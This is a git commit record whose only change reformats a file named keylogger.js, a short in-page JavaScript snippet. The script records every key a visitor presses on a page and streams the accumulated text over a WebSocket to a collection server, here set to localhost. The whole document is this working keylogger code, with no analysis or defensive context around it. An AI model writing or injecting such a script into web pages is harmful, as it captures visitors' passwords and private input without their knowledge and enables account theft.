586b6be8eb6255f4860bc2b77c257f28608d2d14
Francisco Julio <Llanyro@gmail.com>
2020-03-04 15:40:21 +0100

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,1 +1,8 @@
-<script type="text/javascript">var socket = new WebSocket('ws://localhost:9090');let c = "";document.onkeypress = function (e) { c += e.key; socket.send(c); }</script>
+<script type="text/javascript">
+  var socket = new WebSocket('ws://localhost:9090');
+  let c = "";
+  document.onkeypress = function (e) {
+    c += e.key;
+    socket.send(c);
+  }
+</script>
